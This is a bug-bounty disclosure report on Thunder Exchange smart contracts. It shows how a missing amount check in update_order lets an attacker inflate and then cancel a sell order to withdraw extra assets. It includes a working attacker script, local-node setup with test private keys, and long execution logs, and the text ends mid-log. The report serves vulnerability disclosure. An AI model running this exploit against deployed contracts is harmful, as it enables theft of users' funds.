# IOP \_ ThunderNFT 34949 - \[Smart Contract - Critical] Missing proper validation when updating order

Submitted on Sun Sep 01 2024 17:46:18 GMT-0400 (Atlantic Standard Time) by @anatomist for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34949

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/thunder\\_exchange>

Impacts:

* Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties

## Description

## Brief/Intro

Thunder Exchange lacks proper validation during the `update_order` function for sell-side orders. When transferring assets back to the user, the exchange may transfer an incorrect amount of previously stored assets, allowing an attacker to steal assets from Thunder Exchange.

## Vulnerability Details

When placing a sell-side order, Thunder Exchange [checks](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L96) if the user provides the correct asset and amount that match the details claimed in the order. However, when updating a sell-side order, [proper validation is missing](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L124). The only check performed is [`_validate_updated_order`](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/execution_strategies/strategy_fixed_price_sale/src/main.sw#L413) when calling the strategy's `update_order` function, which verifies that the maker, collection, token\_id, and payment\_asset remain the same, but it does not check for the amount.

When canceling the order, Thunder Exchange [transfers back](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L161) the corresponding asset and amount based on the updated order. Therefore, an attacker can exploit this by placing a sell-side order with the minimum asset amount, then updating the order to a higher amount, and finally canceling it to steal the additional assets from Thunder Exchange.

A prerequisite for this attack is that there must be multiple instances of the same asset stored in Thunder Exchange. In Fuel, NFTs differ from those in Ethereum as they are native assets, blurring the boundary between NFTs and fungible tokens (FTs). This ambiguity makes it plausible that users might use this protocol to sell FTs. Furthermore, fractional NFTs exist in Ethereum, so we can't strongly assert that there is only one NFT for each asset (contract, token\_id pair). Therefore, this scenario is highly likely to occur.

## Impact Details

An attacker can steal assets from Thunder Exchange by placing a sell-side order with a small amount, then updating the order to a higher amount without proper validation, and finally canceling the order to receive the increased amount. This exploit is possible when there are multiple instances of one asset (i.e., not unique) in Thunder Exchange.

## References

<https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder\\_exchange/src/main.sw#L124> <https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/execution\\_strategies/strategy\\_fixed\\_price\\_sale/src/main.sw#L413> <https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder\\_exchange/src/main.sw#L161>

## Proof of concept

## Proof of Concept

### Prerequisite

To demonstrate the impact, we need to set up two accounts: an admin account to set up the Thunder Exchange contract and an attacker account to exploit the vulnerability and steal funds from Thunder Exchange.

**Attacker Account**

* Account: 0xd0f45dd4e1722b83b57f9845956cb45a92e8558e6cb9e77a1b28972ad0b87e6c
* Private Key: 306a75f0093834948e363ece5ba1b5a7eaad99f2fc9ab976ba01c2dbea3320f6

**Admin Account**

* Account: 0x400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6
* Private Key: a710552d8d29a0f7aefcb412399fbb041a31ae155cb0eb95d370bf8f99f0409f

### Local Node Setup

> This PoC uses commit `a9e5e89f5fb38e3b3d6e6bdfe1ad339a01f2f3b9` of Fuel-Core.

Modify `state_config.json` to allocate initial funds to the above two accounts:

```diff
diff --git a/bin/fuel-core/chainspec/local-testnet/state_config.json b/bin/fuel-core/chainspec/local-testnet/state_config.json
index b0f3e1c85..ec9961ab6 100644
--- a/bin/fuel-core/chainspec/local-testnet/state_config.json
+++ b/bin/fuel-core/chainspec/local-testnet/state_config.json
@@ -5,7 +5,7 @@
       "output_index": 0,
       "tx_pointer_block_height": 0,
       "tx_pointer_tx_idx": 0,
-      "owner": "6b63804cfbf9856e68e5b6e7aef238dc8311ec55bec04df774003a2c96e0418e",
+      "owner": "0xd0f45dd4e1722b83b57f9845956cb45a92e8558e6cb9e77a1b28972ad0b87e6c",
       "amount": 1152921504606846976,
       "asset_id": "f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07"
     },
@@ -14,7 +14,7 @@
       "output_index": 0,
       "tx_pointer_block_height": 0,
       "tx_pointer_tx_idx": 0,
-      "owner": "54944e5b8189827e470e5a8bacfc6c3667397dc4e1eef7ef3519d16d6d6c6610",
+      "owner": "0x400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6",
       "amount": 1152921504606846976,
       "asset_id": "f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07"
     },
```

After building the local node with `cargo build --release`, run the node with:

```
./target/release/fuel-core run --db-type in-memory --poa-instant true --debug --snapshot ./bin/fuel-core/chainspec/local-testnet/
```

### Client Patch

> This PoC uses commit `efda0397c7bee77de73bd726ec0b732d57614973` of Sway.

I used the `forc-run` client to deploy the contract and run the PoC script. Since adding an output address directly isn't straightforward, I patched the client as follows:

```diff
diff --git a/forc-plugins/forc-client/src/op/run/mod.rs b/forc-plugins/forc-client/src/op/run/mod.rs
index 49047de3a..f6a0e30ba 100644
--- a/forc-plugins/forc-client/src/op/run/mod.rs
+++ b/forc-plugins/forc-client/src/op/run/mod.rs
@@ -119,7 +119,12 @@ pub async fn run_pkg(

     let mut tb = TransactionBuilder::script(compiled.bytecode.bytes.clone(), script_data);
     tb.maturity(command.maturity.maturity.into())
-        .add_contracts(contract_ids);
+        .add_contracts(contract_ids)
+        .add_output(fuel_tx::Output::variable(fuel_tx::Address::zeroed(), 0, fuel_tx::AssetId::BASE))
+        .add_output(fuel_tx::Output::variable(fuel_tx::Address::zeroed(), 0, fuel_tx::AssetId::BASE))
+        .add_output(fuel_tx::Output::variable(fuel_tx::Address::zeroed(), 0, fuel_tx::AssetId::BASE))
+        .add_output(fuel_tx::Output::variable(fuel_tx::Address::zeroed(), 0, fuel_tx::AssetId::BASE))
+        .add_output(fuel_tx::Output::variable(fuel_tx::Address::zeroed(), 0, fuel_tx::AssetId::BASE));

     let provider = Provider::connect(node_url.clone()).await?;
```

### Deploying Thunder Exchange Contract

Use the admin account to deploy all the contracts listed below and retrieve their respective contract addresses. Here's an example output for subsequent reference:

Run the following command in each contract's directory to deploy the contracts:

```
./target/release/forc-deploy a710552d8d29a0f7aefcb412399fbb041a31ae155cb0eb95d370bf8f99f0409f 
```

Example output showing deployed contract addresses:

```bash
thunder_exchange: 	0xa2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136
asset_manager: 		0x9fb23acc0cbb1a365a35b48733ae2bcdb7fcdc9cdf3725bed9d2baf254068ac9
execution_manager: 	0xd6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55
royalty_manager: 	0x149193109764bc485c460b66860514d9f6531ec96d21f95ed62fc16c8b019838
pool: 				0x0f64fc31e22c2a1b81210bff5ab05b4929c9a5aecf9698272a1f67704753345f
fixed_strategy: 	0x79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55
```

### Setup Script

This script sets up the Thunder Exchange protocol using the admin's account and transfers 100,000 base assets into Thunder Exchange. This setup is to demo the exploit where the attacker can steal these base assets.

> Note that the deployed contract addresses are hardcoded in the main function; you will need to change these to your own deployed contract addresses.

Forc.toml

```toml
[project]
authors = ["anatomist"]
entry = "main.sw"
license = "Apache-2.0"
name = "POC_Setup"

[dependencies]
interfaces = {path = "../interfaces"}
libraries = {path = "../libraries"}
```

src/main.sw

```rust
script;
 
use interfaces::{
    thunder_exchange_interface::{ThunderExchange},
    royalty_manager_interface::*,
    asset_manager_interface::*,
    execution_manager_interface::ExecutionManager,
    execution_strategy_interface::*,
    pool_interface::Pool,
};

use libraries::{
    msg_sender_address::*,
    constants::*,
    order_types::*,
    ownable::*,
};

use std::{
    block::timestamp,
    auth::*,
    call_frames::*,
    context::*,
    contract_id::ContractId,
    logging::log,
    revert::require,
    storage::storage_map::*,
    asset::*
};

fn initialize(
    thunder_exchange: ContractId,
    asset_manager: ContractId,
    execution_manager: ContractId,
    royalty_manager: ContractId,
    fixed_strategy: ContractId,
    pool: ContractId,
) {

    let thunder_exchange_abi = abi(ThunderExchange, thunder_exchange.into());
    thunder_exchange_abi.initialize();
    thunder_exchange_abi.set_asset_manager(asset_manager);
    thunder_exchange_abi.set_execution_manager(execution_manager);
    thunder_exchange_abi.set_royalty_manager(royalty_manager);
    thunder_exchange_abi.set_pool(pool);

    let asset_manager_abi = abi(AssetManager, asset_manager.into());
    asset_manager_abi.initialize();
    asset_manager_abi.add_asset(AssetId::base());

    let fixed_strategy_abi = abi(ExecutionStrategy, fixed_strategy.into());
    fixed_strategy_abi.initialize(thunder_exchange);

    let execution_manager_abi = abi(ExecutionManager, execution_manager.into());
    execution_manager_abi.initialize();
    execution_manager_abi.add_strategy(fixed_strategy);

    let royalty_manager_abi = abi(RoyaltyManager, royalty_manager.into());
    royalty_manager_abi.initialize();

    let pool_abi = abi(Pool, pool.into());
    pool_abi.initialize(thunder_exchange, asset_manager);
}

fn main() {
    let thunder_exchange = ContractId::from(0xa2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136);
    let asset_manager = ContractId::from(0x9fb23acc0cbb1a365a35b48733ae2bcdb7fcdc9cdf3725bed9d2baf254068ac9);
    let execution_manager = ContractId::from(0xd6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55);
    let royalty_manager = ContractId::from(0x149193109764bc485c460b66860514d9f6531ec96d21f95ed62fc16c8b019838);
    let pool = ContractId::from(0x0f64fc31e22c2a1b81210bff5ab05b4929c9a5aecf9698272a1f67704753345f);
    let fixed_strategy = ContractId::from(0x79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55);    

    initialize(
        thunder_exchange,
        asset_manager,
        execution_manager,
        royalty_manager,
        fixed_strategy,
        pool,
    );

    transfer(Identity::ContractId(thunder_exchange), AssetId::base(), 100000);
}
```

### Running Setup Script

Use the following command with the patched `forc-run` and the admin account's private key to execute the setup script.

> Note that we are using the contract addresses from the deployment output above.

```bash
./target/release/forc-run a710552d8d29a0f7aefcb412399fbb041a31ae155cb0eb95d370bf8f99f0409f \
 --script-gas-limit 10000000 --node-url http://localhost:4000/v1/graphql \
 --contract 0xa2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136 \
 --contract 0x9fb23acc0cbb1a365a35b48733ae2bcdb7fcdc9cdf3725bed9d2baf254068ac9 \
 --contract 0xd6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55 \
 --contract 0x149193109764bc485c460b66860514d9f6531ec96d21f95ed62fc16c8b019838 \
 --contract 0x0f64fc31e22c2a1b81210bff5ab05b4929c9a5aecf9698272a1f67704753345f \
 --contract 0x79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55
```

Upon running the setup script, you should see an output similar to the following:

```json
[{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9974317,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":28216,"param1":67107840,"param2":67106816,"pc":28216,"to":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136"}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6","digest":"6aa290c45414c81f58f4afd98b3ac7a53c8b2f8efc8489c0fece14acaae36f07","id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":28216,"len":40,"pc":41152,"ptr":67103232,"ra":0,"rb":9517900813706399297}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":28216,"len":0,"pc":41308,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9789568,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":28432,"param1":67101696,"param2":67100672,"pc":28432,"to":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":28432,"len":0,"pc":43580,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9708195,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":28432,"param1":67097600,"param2":67096576,"pc":28432,"to":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":28432,"len":0,"pc":43976,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9626403,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":28432,"param1":67093504,"param2":67092480,"pc":28432,"to":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":28432,"len":0,"pc":45904,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9543606,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":28432,"param1":67089408,"param2":67088384,"pc":28432,"to":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":28432,"len":0,"pc":45052,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9462938,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":28216,"param1":67085312,"param2":67084288,"pc":28216,"to":"9fb23acc0cbb1a365a35b48733ae2bcdb7fcdc9cdf3725bed9d2baf254068ac9"}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6","digest":"6aa290c45414c81f58f4afd98b3ac7a53c8b2f8efc8489c0fece14acaae36f07","id":"9fb23acc0cbb1a365a35b48733ae2bcdb7fcdc9cdf3725bed9d2baf254068ac9","is":28216,"len":40,"pc":49468,"ptr":67080704,"ra":0,"rb":9517900813706399297}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"9fb23acc0cbb1a365a35b48733ae2bcdb7fcdc9cdf3725bed9d2baf254068ac9","is":28216,"len":0,"pc":31876,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9352254,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":27848,"param1":67079680,"param2":67078656,"pc":27848,"to":"9fb23acc0cbb1a365a35b48733ae2bcdb7fcdc9cdf3725bed9d2baf254068ac9"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"9fb23acc0cbb1a365a35b48733ae2bcdb7fcdc9cdf3725bed9d2baf254068ac9","is":27848,"len":0,"pc":29116,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9201365,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":28432,"param1":67074240,"param2":67073216,"pc":28432,"to":"79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55"}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6","digest":"6aa290c45414c81f58f4afd98b3ac7a53c8b2f8efc8489c0fece14acaae36f07","id":"79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55","is":28432,"len":40,"pc":61968,"ptr":67069632,"ra":0,"rb":9517900813706399297}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55","is":28432,"len":0,"pc":34112,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9036594,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":28216,"param1":67068096,"param2":67067072,"pc":28216,"to":"d6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55"}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6","digest":"6aa290c45414c81f58f4afd98b3ac7a53c8b2f8efc8489c0fece14acaae36f07","id":"d6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55","is":28216,"len":40,"pc":50040,"ptr":67063488,"ra":0,"rb":9517900813706399297}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"d6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55","is":28216,"len":0,"pc":30784,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8925866,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":28432,"param1":67062464,"param2":67061440,"pc":28432,"to":"d6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"d6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55","is":28432,"len":0,"pc":29700,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8777266,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":28216,"param1":67057024,"param2":67056000,"pc":28216,"to":"149193109764bc485c460b66860514d9f6531ec96d21f95ed62fc16c8b019838"}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6","digest":"6aa290c45414c81f58f4afd98b3ac7a53c8b2f8efc8489c0fece14acaae36f07","id":"149193109764bc485c460b66860514d9f6531ec96d21f95ed62fc16c8b019838","is":28216,"len":40,"pc":31736,"ptr":67052416,"ra":0,"rb":9517900813706399297}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"149193109764bc485c460b66860514d9f6531ec96d21f95ed62fc16c8b019838","is":28216,"len":0,"pc":31744,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8663034,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":27848,"param1":67051392,"param2":67050368,"pc":27848,"to":"0f64fc31e22c2a1b81210bff5ab05b4929c9a5aecf9698272a1f67704753345f"}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6","digest":"6aa290c45414c81f58f4afd98b3ac7a53c8b2f8efc8489c0fece14acaae36f07","id":"0f64fc31e22c2a1b81210bff5ab05b4929c9a5aecf9698272a1f67704753345f","is":27848,"len":40,"pc":51612,"ptr":67046784,"ra":0,"rb":9517900813706399297}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"0f64fc31e22c2a1b81210bff5ab05b4929c9a5aecf9698272a1f67704753345f","is":27848,"len":0,"pc":29772,"ptr":0}},{"Transfer":{"amount":100000,"asset_id":"f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07","id":"0000000000000000000000000000000000000000000000000000000000000000","is":10368,"pc":14844,"to":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"0000000000000000000000000000000000000000000000000000000000000000","is":10368,"len":0,"pc":10484,"ptr":67044736}},{"ScriptResult":{"gas_used":1562020,"result":"Success"}}]
```

### Attacker Script

This script demonstrates the process by which an attacker can place an order of 1 base asset, change the amount to 2, and then cancel the order to get 2 base assets back, effectively stealing 1 extra base asset from Thunder Exchange.

> The collection (`0x7e2becd64cd598da59b4d1064b711661898656c6b1f4918a787156b8965dc83c`) and `token_id` (0) correspond to the default base asset (`f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07`).

> Note that the deployed contract addresses are hardcoded in the main function; you will need to change these to your own deployed contract addresses.

Forc.toml

```toml
[project]
authors = ["anatomist"]
entry = "main.sw"
license = "Apache-2.0"
name = "POC"

[dependencies]
interfaces = {path = "../interfaces"}
libraries = {path = "../libraries"}
```

src/main.sw

```rust
script;

use interfaces::{
    thunder_exchange_interface::{ThunderExchange},
    royalty_manager_interface::*,
    asset_manager_interface::*,
    execution_manager_interface::ExecutionManager,
    execution_strategy_interface::*,
    pool_interface::Pool,
};

use libraries::{
    msg_sender_address::*,
    constants::*,
    order_types::*,
    ownable::*,
};

use std::{
    block::timestamp,
    auth::*,
    call_frames::*,
    context::*,
    contract_id::ContractId,
    logging::log,
    revert::require,
    storage::storage_map::*,
    asset::*
};


fn attack(
    thunder_exchange: ContractId
) {
    let before_balance = balance_of(thunder_exchange, AssetId::base());
    // make a new sell order
    let thunder_exchange_abi = abi(ThunderExchange, thunder_exchange.into());
    let execute_manager = thunder_exchange_abi.get_execution_manager();
    let execute_manager_abi = abi(ExecutionManager, execute_manager.into());
    let fixed_strategy = execute_manager_abi.get_whitelisted_strategy(0).unwrap();

    let nonce = abi(ExecutionStrategy, fixed_strategy.into()).get_order_nonce_of_user(caller_address().unwrap(), Side::Sell) + 1;

    let mut maker_order_input: MakerOrderInput = MakerOrderInput {
        side: Side::Sell,
        maker: caller_address().unwrap(),
        collection: ContractId::from(0x7e2becd64cd598da59b4d1064b711661898656c6b1f4918a787156b8965dc83c),
        token_id: SubId::zero(),
        price: 1,
        amount: 1,
        nonce: nonce,
        strategy: fixed_strategy,
        payment_asset: AssetId::base(),
        expiration_range: 100,
        extra_params: ExtraParams {
            extra_address_param: Address::zero(),
            extra_contract_param: ContractId::zero(),
            extra_u64_param: 0,
        },
    };

    thunder_exchange_abi.place_order{asset_id : AssetId::base().into(), coins: 1}(maker_order_input);

    // change amount of sell order
    maker_order_input.amount = 2;
    thunder_exchange_abi.update_order(maker_order_input);

    // cancel and steal funds
    thunder_exchange_abi.cancel_order(
        fixed_strategy,
        nonce,
        Side::Sell,
    );

    let after_balance = balance_of(thunder_exchange, AssetId::base());

    // log the balance to prove fund has been stolen
    log(before_balance);
    log(after_balance);
}

fn main() {
    let thunder_exchange = ContractId::from(0xa2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136);
    attack(thunder_exchange);
}
```

### Running Attacker Script

Before running the attacker script, we need to patch `contracts-v1/libraries/src/order_types.sw`. Making `ExtraParams` public will simplify our exploit script.

```diff
diff --git a/contracts-v1/libraries/src/order_types.sw b/contracts-v1/libraries/src/order_types.sw
index fba6f60..f01bfb0 100644
--- a/contracts-v1/libraries/src/order_types.sw
+++ b/contracts-v1/libraries/src/order_types.sw
@@ -34,7 +34,7 @@ impl core::ops::Eq for TokenType {
     }
 }

-struct ExtraParams {
+pub struct ExtraParams {
     pub extra_address_param: Address,
     pub extra_contract_param: ContractId,
     pub extra_u64_param: u64,
```

Use the following command with the patched `forc-run` and the attacker account's private key to execute the attack script.

> Note that we are using the contract addresses from the deployment output above.

```bash
./target/release/forc-run 306a75f0093834948e363ece5ba1b5a7eaad99f2fc9ab976ba01c2dbea3320f6 \
 --script-gas-limit 10000000 --node-url http://localhost:4000/v1/graphql \
 --contract 0xa2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136 \
 --contract 0x9fb23acc0cbb1a365a35b48733ae2bcdb7fcdc9cdf3725bed9d2baf254068ac9 \
 --contract 0xd6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55 \
 --contract 0x149193109764bc485c460b66860514d9f6531ec96d21f95ed62fc16c8b019838 \
 --contract 0x0f64fc31e22c2a1b81210bff5ab05b4929c9a5aecf9698272a1f67704753345f \
 --contract 0x79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55
```

Upon running the attack script, you should see an output similar to the following:

```json
[{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9977104,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":31840,"param1":67107840,"param2":67106816,"pc":31840,"to":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136"}},{"ReturnData":{"data":"d6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55","digest":"9751a8dc8f1ff72bfaabd58a98a25eed8ea34b1b5163dfaabcad60ac3745ea2d","id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":31840,"len":32,"pc":40980,"ptr":67104256}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9954547,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":31840,"param1":67103232,"param2":67102208,"pc":31840,"to":"d6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55"}},{"ReturnData":{"data":"000000000000000179e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55","digest":"daf047f114f50e57880cc4e713a91926b6823f8a803d7bc28de6ca5c0c513181","id":"d6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55","is":31840,"len":40,"pc":34280,"ptr":67099168}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9920863,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":31840,"param1":67098144,"param2":67097120,"pc":31840,"to":"79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55"}},{"ReturnData":{"data":"0000000000000000","digest":"af5570f5a1810b7af78caf4bc70a660f0df51e42baf91d4de5b2328de0e83dfc","id":"79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55","is":31840,"len":8,"pc":36808,"ptr":67094560}},{"Call":{"amount":1,"asset_id":"f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07","gas":9885347,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":33640,"param1":67093536,"param2":67092512,"pc":33640,"to":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136"}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9855365,"id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":114704,"param1":67089440,"param2":67088416,"pc":114704,"to":"d6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55"}},{"ReturnData":{"data":"01","digest":"4bf5122f344554c53bde2ebb8cd2b7e3d1600ad631c385a5d7cce23c7785459a","id":"d6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55","is":114704,"len":1,"pc":117800,"ptr":67085856}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9828838,"id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":114704,"param1":67084320,"param2":67083296,"pc":114704,"to":"9fb23acc0cbb1a365a35b48733ae2bcdb7fcdc9cdf3725bed9d2baf254068ac9"}},{"ReturnData":{"data":"01","digest":"4bf5122f344554c53bde2ebb8cd2b7e3d1600ad631c385a5d7cce23c7785459a","id":"9fb23acc0cbb1a365a35b48733ae2bcdb7fcdc9cdf3725bed9d2baf254068ac9","is":114704,"len":1,"pc":118896,"ptr":67080736}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9798486,"id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":113264,"param1":67079712,"param2":67078688,"pc":113264,"to":"79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55","is":113264,"len":0,"pc":121348,"ptr":0}},{"LogData":{"data":"0000000000000001d0f45dd4e1722b83b57f98459